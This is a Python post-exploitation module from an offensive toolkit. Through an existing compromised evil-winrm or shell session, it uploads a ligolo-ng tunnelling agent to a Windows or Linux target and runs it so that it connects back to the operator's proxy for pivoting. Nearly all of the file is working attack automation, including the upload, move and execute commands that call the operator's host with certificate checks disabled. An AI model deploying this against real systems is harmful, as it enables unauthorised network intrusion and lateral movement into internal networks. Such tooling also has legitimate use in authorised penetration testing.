"""
Ligolo-ng Pivot Module
Auto-upload and execute ligolo agent on target via existing session
"""

import os
import subprocess
import time
from pathlib import Path
from core.module_base import ModuleBase, ModuleType, Platform


class LigoloPivot(ModuleBase):
    """
    Automatically upload and execute ligolo-ng agent on a target
    through an existing session (evil-winrm, shell, etc.)
    """

    def __init__(self):
        super().__init__()
        self.name = "ligolo_pivot"
        self.description = "Upload and execute ligolo-ng agent for pivoting"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.POST
        self.platform = Platform.MULTI
        self.tags = ["pivot", "tunnel", "ligolo", "post", "lateral"]
        self.references = [
            "https://github.com/nicocha30/ligolo-ng"
        ]

        # Session options
        self.register_option("SESSION", "Tmux session ID or name to use", required=True)

        # Ligolo options
        self.register_option("LHOST", "Ligolo proxy IP (your IP)", required=True)
        self.register_option("LPORT", "Ligolo proxy port", default="11601")

        # Target options
        self.register_option("TARGET_OS", "Target OS",
                           default="windows",
                           choices=["windows", "linux"])
        self.register_option("UPLOAD_PATH", "Path to upload agent on target",
                           default="C:\\Windows\\Temp\\agent.exe")

        # Agent paths
        self.register_option("AGENT_PATH", "Local path to ligolo agent (auto-detect if empty)",
                           default="")

        # Execution options
        self.register_option("EXECUTE", "Auto-execute after upload",
                           default="yes", choices=["yes", "no"])
        self.register_option("CLEANUP", "Command to cleanup agent after (leave empty to skip)",
                           default="")

    def _find_agent(self, target_os: str) -> str:
        """Find the ligolo agent binary for the target OS"""
        # Check for pre-compiled agents in common locations
        if target_os == "windows":
            search_names = [
                "agent.exe",
                "agent_windows_amd64.exe",
                "ligolo-agent.exe",
                "agent_windows.exe",
            ]
        else:
            search_names = [
                "agent_linux_amd64",
                "agent_linux",
                "ligolo-agent",
                "agent",  # Generic name last
            ]

        # Check if running from uwu-toolkit directory (evil-winrm prepends cwd to paths)
        # Use relative path if agent is in sibling directory
        if target_os == "windows":
            full_agent_path = "/opt/my-resources/tools/ligolo-ng/agent.exe"
            relative_agent = "../ligolo-ng/agent.exe"
        else:
            full_agent_path = "/opt/my-resources/tools/ligolo-ng/agent_linux_amd64"
            relative_agent = "../ligolo-ng/agent_linux_amd64"

        if os.path.isfile(full_agent_path):
            # We're in exegol - use relative path for evil-winrm compatibility
            return relative_agent

        search_paths = [
            "/opt/my-resources/tools/ligolo-ng",  # Exegol mounted path
            "/opt/tools/ligolo-ng",
            "/opt/tools/ligolo-ng/bin",
            "/opt/ligolo-ng",
            "/opt/tools",
            "/usr/local/bin",
            os.path.expanduser("~/.local/bin"),
            os.path.expanduser("~/.local/share/ligolo-ng"),  # UwU download location
            "/opt/my-resources/tools",
        ]

        for base_path in search_paths:
            for name in search_names:
                full_path = os.path.join(base_path, name)
                if os.path.isfile(full_path):
                    return full_path

        # Also check for the generic 'agent' binary that needs to be compiled for Windows
        # In exegol, the source is at /opt/tools/ligolo-ng with 'agent' directory
        agent_src = "/opt/tools/ligolo-ng/agent"
        if os.path.isdir(agent_src):
            self.print_warning("Found ligolo source but no compiled agent binaries")
            self.print_status("Run: ligolo download  - to get pre-compiled agents")

        return ""

    def _get_tmux_sessions(self) -> list:
        """Get list of uwu tmux sessions"""
        try:
            result = subprocess.run(
                ["tmux", "list-sessions", "-F", "#{session_name}"],
                capture_output=True, text=True, timeout=5
            )
            sessions = []
            for line in result.stdout.strip().split('\n'):
                if line and line.startswith("uwu-"):
                    sessions.append(line)
            return sessions
        except:
            return []

    def _send_to_session(self, session_name: str, command: str, enter: bool = True) -> bool:
        """Send a command to a tmux session"""
        try:
            cmd = ["tmux", "send-keys", "-t", session_name, command]
            if enter:
                cmd.append("Enter")
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            return result.returncode == 0
        except Exception as e:
            self.print_error(f"Failed to send command: {e}")
            return False

    def _resolve_session(self, session_input: str) -> str:
        """Resolve session ID to actual session name"""
        sessions = self._get_tmux_sessions()

        # If it's a number, get by index
        try:
            idx = int(session_input)
            if 1 <= idx <= len(sessions):
                return sessions[idx - 1]
        except ValueError:
            pass

        # If it's a name, check if it exists
        if session_input in sessions:
            return session_input

        # Try with uwu- prefix
        if f"uwu-{session_input}" in sessions:
            return f"uwu-{session_input}"

        return ""

    def _resolve_interface_ip(self, interface: str) -> str:
        """Resolve interface name (e.g., tun0) to IP address"""
        import socket
        import fcntl
        import struct

        # If it's already an IP, return it
        try:
            socket.inet_aton(interface)
            return interface
        except socket.error:
            pass

        # Try to get IP from interface name
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            ip = socket.inet_ntoa(fcntl.ioctl(
                s.fileno(),
                0x8915,  # SIOCGIFADDR
                struct.pack('256s', interface[:15].encode('utf-8'))
            )[20:24])
            return ip
        except Exception:
            pass

        # Fallback: try ip command
        try:
            result = subprocess.run(
                ["ip", "-4", "addr", "show", interface],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split('\n'):
                if 'inet ' in line:
                    # Extract IP from "inet 10.10.14.50/23"
                    parts = line.strip().split()
                    for i, p in enumerate(parts):
                        if p == 'inet' and i + 1 < len(parts):
                            return parts[i + 1].split('/')[0]
        except Exception:
            pass

        return interface  # Return original if resolution fails

    def run(self) -> bool:
        session_input = self.get_option("SESSION")
        lhost = self.get_option("LHOST")
        lport = self.get_option("LPORT")
        target_os = self.get_option("TARGET_OS")
        upload_path = self.get_option("UPLOAD_PATH")
        agent_path = self.get_option("AGENT_PATH")
        auto_execute = self.get_option("EXECUTE") == "yes"

        # Resolve LHOST if it's an interface name
        original_lhost = lhost
        lhost = self._resolve_interface_ip(lhost)
        if lhost != original_lhost:
            self.print_status(f"Resolved {original_lhost} -> {lhost}")

        # Resolve session
        session_name = self._resolve_session(session_input)
        if not session_name:
            self.print_error(f"Session not found: {session_input}")
            self.print_status("Available sessions:")
            for i, sess in enumerate(self._get_tmux_sessions(), 1):
                self.print_line(f"  [{i}] {sess}")
            return False

        self.print_status(f"Using session: {session_name}")

        # Find agent binary
        if not agent_path:
            agent_path = self._find_agent(target_os)

        if not agent_path or not os.path.isfile(agent_path):
            self.print_error("Ligolo agent not found!")
            self.print_status("Run 'ligolo download' to fetch latest agents from GitHub")
            self.print_status("Or set AGENT_PATH manually if agent is in a different location")
            return False

        self.print_good(f"Found agent: {agent_path}")
        self.print_status(f"Target: {target_os.upper()}")
        self.print_status(f"Upload to: {upload_path}")
        self.print_status(f"Connect to: {lhost}:{lport}")
        self.print_line()

        # Adjust upload path for Linux
        if target_os == "linux" and upload_path.startswith("C:"):
            upload_path = "/tmp/agent"
            self.print_warning(f"Adjusted upload path for Linux: {upload_path}")

        # Get just the filename from agent_path
        agent_filename = os.path.basename(agent_path)

        # Step 1: Upload the agent
        self.print_status("Step 1: Uploading agent...")

        if target_os == "windows":
            # Evil-WinRM: upload to current directory first (avoids path escaping issues)
            upload_cmd = f"upload {agent_path}"
            self.print_status(f"Sending: {upload_cmd}")
            if not self._send_to_session(session_name, upload_cmd):
                self.print_error("Failed to send upload command")
                return False

            # Wait for upload
            self.print_status("Waiting for upload to complete...")
            time.sleep(5)

            # Move to target location if different from current dir
            if upload_path and not upload_path.endswith(agent_filename):
                # Extract just the filename for the destination
                dest_filename = os.path.basename(upload_path)
                move_cmd = f"move {agent_filename} {upload_path}"
                self.print_status(f"Moving agent: {move_cmd}")
                self._send_to_session(session_name, move_cmd)
                time.sleep(1)
            else:
                # Execute from current directory
                upload_path = f".\\{agent_filename}"
        else:
            # For Linux shells
            upload_cmd = f"upload {agent_path} {upload_path}"
            self.print_status(f"Sending: {upload_cmd}")
            if not self._send_to_session(session_name, upload_cmd):
                self.print_error("Failed to send upload command")
                return False
            self.print_status("Waiting for upload to complete...")
            time.sleep(3)

        # Step 2: Execute the agent
        if auto_execute:
            self.print_status("Step 2: Executing agent...")

            if target_os == "windows":
                # Execute on Windows - use .\ prefix for current directory
                if upload_path.startswith(".\\"):
                    exec_cmd = f'{upload_path} -connect {lhost}:{lport} -ignore-cert'
                else:
                    exec_cmd = f'{upload_path} -connect {lhost}:{lport} -ignore-cert'
            else:
                # Execute on Linux
                exec_cmd = f'chmod +x {upload_path} && {upload_path} -connect {lhost}:{lport} -ignore-cert &'

            self.print_status(f"Sending: {exec_cmd}")
            if not self._send_to_session(session_name, exec_cmd):
                self.print_error("Failed to send execute command")
                return False

            self.print_line()
            self.print_good("Agent deployed!")
            self.print_status("Check your ligolo proxy for the new agent connection")
            self.print_status("In ligolo: session -> 1 -> start")
        else:
            self.print_line()
            self.print_good("Agent uploaded!")
            self.print_status(f"Execute manually: {upload_path} -connect {lhost}:{lport} -ignore-cert")

        return True

    def check(self) -> bool:
        """Check if ligolo agent is available"""
        windows_agent = self._find_agent("windows")
        linux_agent = self._find_agent("linux")
        return bool(windows_agent or linux_agent)
